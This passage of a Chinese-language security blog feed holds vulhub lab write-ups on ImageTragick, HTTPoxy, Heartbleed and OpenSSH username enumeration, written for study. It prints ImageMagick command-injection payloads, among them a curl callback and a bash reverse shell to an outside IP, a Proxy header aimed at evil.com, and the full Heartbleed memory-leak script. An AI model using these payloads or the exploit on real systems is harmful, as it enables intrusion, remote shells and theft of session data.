class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>xps:cmyk<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>bmpsep8&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>delegate</span> <span class="token attr-name">decode</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>xps:mono<span class="token punctuation">"</span></span> <span class="token attr-name">stealth</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>True<span class="token punctuation">"</span></span> <span class="token attr-name">command</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;quot;gxps&amp;quot; -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap<span class="token punctuation">=</span>500000000 -dAlignToPixels<span class="token punctuation">=</span>0 -dGridFitTT<span class="token punctuation">=</span>2 &amp;quot;-sDEVICE<span class="token punctuation">=</span>pbmraw&amp;quot; -dTextAlphaBits<span class="token punctuation">=</span>%u -dGraphicsAlphaBits<span class="token punctuation">=</span>%u &amp;quot;-r%s&amp;quot; %s &amp;quot;-sOutputFile<span class="token punctuation">=</span>%s&amp;quot; &amp;quot;%s&amp;quot;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>delegatemap</span><span class="token punctuation">></span></span> </code></pre><p>我们可以看到，这里它定义了很多占位符，比如%i是输入的文件名，%l是图片exif label信息。而在后面command的位置，%i和%l等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。</p><p>漏洞报告中给出的POC是利用了如下的这个委托：</p><p><code>&lt;delegate decode="https" command="&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;"/&gt;</code></p><p>它在解析https图片的时候，使用了curl命令将其下载，我们看到%M被直接放在curl的最后一个参数内。ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。</p><p>所以我们可以构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：</p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://"|id; ")'pop graphic-context</code></pre><p>这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>一些测试使用的POC：<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">https://github.com/ImageTragick/PoCs</a></p><p>访问<code>http://your-ip/</code>可见有三个文件：</p><pre><code>├── demo.php # 使用vul.jpg+identify命令测试 ├── upload.php # 支持用户进行上传，并将上传的文件传入PHP的imagick扩展，触发漏洞└── vul.jpg # 一个简单的POC</code></pre><p>首先访问<code>http://your-ip/demo.php</code>，命令并没有回显，但在docker容器中，已经成功得到<code>/tmp/success</code>文件：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115804.png-water_print" alt=""></p><p>再访问<a href="http://your-ip/upload.php测试，上传POC文件，数据包如下" target="_blank" rel="noopener">http://your-ip/upload.php测试，上传POC文件，数据包如下</a>:</p><pre class=" language-HTTP"><code class="language-HTTP">POST /upload.php HTTP/1.1Host: your-ipContent-Length: 321Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydGYwkOC91nnON1wsAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en;q=0.6Connection: close------WebKitFormBoundarydGYwkOC91nnON1wsContent-Disposition: form-data; name="file_upload"; filename="vul.gif"Content-Type: image/jpegpush graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/oops.jpg"|curl "IP:4567)'pop graphic-context------WebKitFormBoundarydGYwkOC91nnON1ws--</code></pre><p>可见，<code>IP:4567</code>已经接收到http请求，说明curl命令执行成功：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115823.png-water_print" alt=""></p><p>反弹shell POC：</p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/oops.jpg"|bash -i &gt;&amp; /dev/tcp/39.96.14.41/4567 0&gt;&amp;1 ")'pop graphic-context</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115833.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> ImageMagick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPoxy漏洞（CVE-2016-5385）</title>
      <link href="/2019/02/21/httpoxy-lou-dong-cve-2016-5385/"/>
      <url>/2019/02/21/httpoxy-lou-dong-cve-2016-5385/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTPoxy漏洞（CVE-2016-5385）"><a href="#HTTPoxy漏洞（CVE-2016-5385）" class="headerlink" title="HTTPoxy漏洞（CVE-2016-5385）"></a>HTTPoxy漏洞（CVE-2016-5385）</h1><h2 id="原理及防御"><a href="#原理及防御" class="headerlink" title="原理及防御"></a>原理及防御</h2><p>核心的背景是，我们习惯了使用一个名为<code>http_proxy</code>的环境变量来设置我们的请求代理，比如在命令行我们经常这么用:</p><pre class=" language-bash"><code class="language-bash">http_proxy<span class="token operator">=</span>127.0.0.1:1080 <span class="token function">wget</span> http://www.geek-by.com/</code></pre><p>通过设置<code>http_proxy</code>环境变量，让wget使用代理请求<code>http://www.geek-by.com/</code></p><p>这样的设定最初来自1994年的<code>CERN libwww 2.15</code>,只不过大多应用都要求http_proxy是全部小写的, 还不足以造成今天这个漏洞。</p><p>但估计是因为环境变量习惯都是大写的原因吧, 后来有的类库开始支持大写的HTTP_PROXY, 比如yum: <code>https://www.centos.org/docs/5/html/yum/sn-yum-proxy-server.html</code></p><p>再后来很多的类库, 各种语言的, 都开始支持这种配置, 有的支持大写的, 有的支持小写的, 还有的都支持。如：Guzzle(支持大写)、Artax(大写, 小写都支持)</p><p>包括我们自己, 也很有可能在日常的工作中写出如下的代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$http_proxy</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"HTTP_PROXY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$http_proxy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'http'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string">'proxy'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$http_proxy</span><span class="token punctuation">,</span>            <span class="token string">'request_fulluri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s_context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$s_context</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.geek-by.com/", false, $s_context);</span></code></pre><p>那么问题来了，在CGI(RFC 3875)的模式的时候，会把请求中的Header，加上HTTP_前缀，注册为环境变量，所以如果你在Header中发送一个Proxy:xxxxxx，那么PHP就会把他注册为HTTP_PROXY环境变量，于是getenv(“HTTP_PROXY”)就变成可被控制的。那么如果你的所有类似的请求，都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了。</p><p>例如：<br><code>curl -H "Proxy:127.0.0.1:8000" http://host.com/httpoxy.php</code></p><p>所以，这个漏洞的复现，有几个核心前提:</p><ul><li>服务会对外请求资源</li><li>服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）</li><li>服务跑在PHP的CGI模式下(cgi，php-fpm)</li></ul><p>那知道了原理修复起来也很简单了, 以Nginx为例, 在配置中加入:<br><code>fastcgi_param HTTP_PROXY "";</code></p><p>所以建议, 即使不受该漏洞的影响，也应该加入这个配置.</p><p>而如果你是一个类库的作者，或者你因为什么原因没有办法修改服务配置，那么你就需要在代码中加入对sapi的判断，除非是cli模式，否则永远不要相信http_proxy环境变量。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">php_sapi_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'cli'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_PROXY'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//只有CLI模式下, HTTP_PROXY环境变量才是可控的</span><span class="token punctuation">}</span></code></pre><p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: <a href="http://evil.com" target="_blank" rel="noopener">http://evil.com</a> 这样的HTTP头，将使用缺陷类库的网站的代理设置为<a href="http://evil.com" target="_blank" rel="noopener">http://evil.com</a> ，进而窃取数据包中可能存在的敏感信息。</p><p>PHP5.6.24版本修复了该漏洞，不会再将Proxy放入环境变量中。本环境使用PHP 5.6.23为例。</p><p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>正常请求<code>http://your-ip/index.php</code>，可见其Origin为当前请求的服务器，二者IP相等：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115522.png-water_print" alt=""></p><p>在其他地方找到一个可以正常运行的http代理，附带Proxy: <code>http://x.x.x.x:xxxx</code>头，再次访问<a href="http://your-ip/index.php：" target="_blank" rel="noopener">http://your-ip/index.php：</a><br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115534.png-water_print" alt=""></p><p>如上图，可见此时的Origin已经变成代理服务器的IP地址，也就是说真正进行HTTP访问的服务器是代理服务器，也就是说代理服务器已经将正常的HTTP请求代理了。</p><p>在x.x.x.x上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190727115549.png-water_print" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">http://www.laruence.com/2016/07/19/3101.html</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> HTTPoxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSL 心脏出血漏洞</title>
      <link href="/2019/02/20/openssl-xin-zang-chu-xie-lou-dong/"/>
      <url>/2019/02/20/openssl-xin-zang-chu-xie-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenSSL-心脏出血漏洞-CVE-2014-0160"><a href="#OpenSSL-心脏出血漏洞-CVE-2014-0160" class="headerlink" title="OpenSSL 心脏出血漏洞 (CVE-2014-0160)"></a>OpenSSL 心脏出血漏洞 (CVE-2014-0160)</h1><p>Run ssltest.py with Python 2 to obtain sensitive data (Cookie)：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><span class="token comment" spellcheck="true"># The author disclaims copyright to this source code.</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> struct<span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> select<span class="token keyword">import</span> re<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParseroptions <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span><span class="token string">'%prog server [options]'</span><span class="token punctuation">,</span> description<span class="token operator">=</span><span class="token string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span><span class="token punctuation">)</span>options<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'TCP port to test (default: 443)'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">h2bin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>hello <span class="token operator">=</span> h2bin<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''16 03 02 00  dc 01 00 00 d8 03 02 5343 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15  00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 0000 0f 00 01 01                                  '''</span><span class="token punctuation">)</span>hb <span class="token operator">=</span> h2bin<span class="token punctuation">(</span><span class="token triple-quoted-string string">''' 18 03 02 00 0301 40 00'''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hexdump</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        lin <span class="token operator">=</span> <span class="token punctuation">[</span>c <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">[</span>b <span class="token punctuation">:</span> b <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        hxdat <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'%02X'</span> <span class="token operator">%</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> lin<span class="token punctuation">)</span>        pdat <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token keyword">if</span> <span class="token number">32</span> <span class="token operator">&lt;=</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">126</span> <span class="token keyword">else</span> <span class="token string">'.'</span> <span class="token punctuation">)</span><span class="token keyword">for</span> c <span class="token keyword">in</span> lin<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'  %04x: %-48s %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> hxdat<span class="token punctuation">,</span> pdat<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token keyword">def</span> <span class="token function">recvall</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> length<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    endtime <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timeout    rdata <span class="token operator">=</span> <span class="token string">''</span>    remain <span class="token operator">=</span> length    <span class="token keyword">while</span> remain <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        rtime <span class="token operator">=</span> endtime <span class="token operator">-</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token keyword">if</span> rtime <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> None        r<span class="token punctuation">,</span> w<span class="token punctuation">,</span> e <span class="token operator">=</span> select<span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> s <span class="token keyword">in</span> r<span class="token punctuation">:</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>remain<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># EOF?</span>            <span class="token keyword">if</span> <span class="token operator">not</span> data<span class="token punctuation">:</span>                <span class="token keyword">return</span> None            rdata <span class="token operator">+=</span> data            remain <span class="token operator">-=</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> rdata<span class="token keyword">def</span> <span class="token function">recvmsg</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    hdr <span class="token operator">=</span> recvall<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hdr <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'Unexpected EOF receiving record header - server closed connection'</span>        <span class="token keyword">return</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> None    typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> ln <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'>BHH'</span><span class="token punctuation">,</span> hdr<span class="token punctuation">)</span>    pay <span class="token operator">=</span> recvall<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ln<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> pay <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'Unexpected EOF receiving record payload - server closed connection'</span>        <span class="token keyword">return</span> None<span class="token punctuation">,</span> None<span class="token punctuation">,</span> None    <span class="token keyword">print</span> <span class="token string">' ... received message: type = %d, ver = %04x, length = %d'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> len<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay<span class="token keyword">def</span> <span class="token function">hit_hb</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hb<span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay <span class="token operator">=</span> recvmsg<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">if</span> typ <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'No heartbeat response received, server likely not vulnerable'</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">24</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'Received heartbeat response:'</span>            hexdump<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>pay<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">'WARNING: server returned more data than it should - server is vulnerable!'</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">'Server processed malformed heartbeat, but did not return any extra data.'</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">21</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'Received alert:'</span>            hexdump<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'Server returned error, likely not vulnerable'</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> options<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">:</span>        options<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'Connecting...'</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> opts<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'Sending Client Hello...'</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hello<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'Waiting for Server Hello...'</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        typ<span class="token punctuation">,</span> ver<span class="token punctuation">,</span> pay <span class="token operator">=</span> recvmsg<span class="token punctuation">(</span>s<span class="token punctuation">)</span>        <span class="token keyword">if</span> typ <span class="token operator">==</span> None<span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'Server closed connection without sending Server Hello.'</span>            <span class="token keyword">return</span>        <span class="token comment" spellcheck="true"># Look for server hello done message.</span>        <span class="token keyword">if</span> typ <span class="token operator">==</span> <span class="token number">22</span> <span class="token operator">and</span> ord<span class="token punctuation">(</span>pay<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x0E</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span> <span class="token string">'Sending heartbeat request...'</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>hb<span class="token punctuation">)</span>    hit_hb<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> OpenSSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSH 用户名枚举漏洞</title>
      <link href="/2019/02/19/openssh-yong-hu-ming-mei-ju-lou-dong/"/>
      <url>/2019/02/19/openssh-yong-hu-ming-mei-ju-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenSSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#OpenSSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="OpenSSH 用户名枚举漏洞（CVE-2018-15473）"></a>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</h1><p>OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</p><p>环境启动后，我们在客户端执行<code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@your-ip -p20022</code>，输入密码<code>vulhub</code>，即可登录到容器中。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用metasploit中对应的模块<br>执行结果如下：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190619141226.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190619141235.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> OpenSSH </tag>
            
        </tags>
      
    </entry>
    
    
    
